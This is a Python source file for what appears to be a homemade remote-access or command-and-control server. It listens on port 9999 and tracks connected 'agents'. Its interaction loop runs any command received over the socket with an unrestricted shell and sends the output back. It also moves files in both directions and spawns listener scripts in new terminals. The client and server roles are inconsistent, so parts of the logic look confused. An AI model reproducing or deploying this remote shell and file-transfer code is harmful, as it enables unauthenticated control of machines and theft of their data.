import socket
import threading
import subprocess
import sys
import os

# A dictionary to store clients and their unique IDs
clients = {}
clients_lock = threading.Lock()

def send_file(client_socket, file_path):
    try:
        if not os.path.isfile(file_path):
            client_socket.send(b"File not found.")
            return

        # Send the file size first
        file_size = os.path.getsize(file_path)
        client_socket.send(f"SEND_FILE {file_size} {os.path.basename(file_path)}".encode('utf-8'))

        # Use a larger buffer size
        buffer_size = 8192  # 8 KB
        with open(file_path, 'rb') as file:
            while True:
                data = file.read(buffer_size)
                if not data:
                    break
                client_socket.send(data)
        
        print(f"[*] Sent file: {file_path}")
    except Exception as e:
        client_socket.send(b"Error sending file.")  # Notify client of the error
        print(f"[*] Failed to send file: {e}")

def receive_file(client_socket, file_name):
    try:
        # Receive the file metadata first
        header = client_socket.recv(1024).decode('utf-8')
        if header.startswith("SEND_FILE"):
            _, file_size, file_name = header.split()
            file_size = int(file_size)

            buffer_size = 8192  # 8 KB
            with open(file_name, 'wb') as file:
                received_size = 0
                while received_size < file_size:
                    data = client_socket.recv(buffer_size)
                    if not data:  # Break if no more data is received
                        break
                    file.write(data)
                    received_size += len(data)

            print(f"[*] Received file: {file_name}")
        else:
            print("[*] Unexpected header received.")
    except Exception as e:
        print(f"[*] Failed to receive file: {e}")
        
# Function to list connected agents
def list_connected_agents():
    if clients:
        print("\nConnected Agents:")
        for client_id, client_socket in clients.items():
            print(f"ID: {client_id}, Address: {client_socket.getpeername()}")
    else:
        print("[*] No agents connected.")

def handle_agent_interaction(selected_client_socket):
    try:
        while True:
            command = selected_client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                print("[*] Closing connection with the agent.")
                break
                
            # Handle file send command
            elif command.startswith("sendfile"):
                _, file_path = command.split(' ', 1)
                send_file(selected_client_socket, file_path)
                
            # Handle file receive command
            elif command.startswith("download"):
                _, file_name = command.split(' ', 1)
                receive_file(selected_client_socket, file_name)
                
            # Execute the command and capture the output
            else:
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                response = output.stdout + output.stderr  # Combine stdout and stderr
                selected_client_socket.send(response.encode('utf-8'))
    except Exception as e:
        print(f"Error during agent interaction: {e}")
    finally:
        selected_client_socket.close()

# Server code - Start listening for incoming connections
def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}...")

    client_id = 1

    try:
        while True:
            client_socket, client_address = server_socket.accept()
            with clients_lock:
                clients[client_id] = client_socket
            print(f"[*] Connection established with client {client_id}")
            list_connected_agents()

            # Receive the agent's port for communication
            agent_port_data = client_socket.recv(1024).decode('utf-8')
            if agent_port_data.startswith("AGENT_PORT"):
                agent_port = int(agent_port_data.split()[1])
                print(f"[*] Agent will listen on port {agent_port}")

                # Open a new terminal to run agent_listener.py with the new port
                if sys.platform.startswith('win'):
                    subprocess.Popen(['start', 'cmd', '/k', 'python', 'agent_listener.py', str(client_id), str(agent_port)], shell=True)
                else:
                    subprocess.Popen(['gnome-terminal', '--', 'python3', 'agent_listener.py', str(client_id), str(agent_port)], shell=True)

                print(f"[*] Started agent listener for Agent {client_id} on port {agent_port}.")
                client_id += 1  # Increment client ID for the next agent
            else:
                print("[*] Failed to receive agent port.")

            while True:
                selected_id = input("Select agent ID to interact with or type 'exit' to disconnect: ")

                if selected_id.lower() == 'exit':
                    print("[*] Disconnecting...")
                    break

                try:
                    selected_id = int(selected_id)
                    if selected_id in clients:
                        print(f"[*] Interacting with Agent {selected_id}")
                        selected_client_socket = clients[selected_id]
                        handle_agent_interaction(selected_client_socket)
                    else:
                        print(f"[*] No agent found with ID {selected_id}")
                except ValueError:
                    print("[*] Invalid ID. Please enter a valid number.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    host = "0.0.0.0"  # Listen on all available network interfaces
    port = 9999        # Port to listen on
    start_server(host, port)
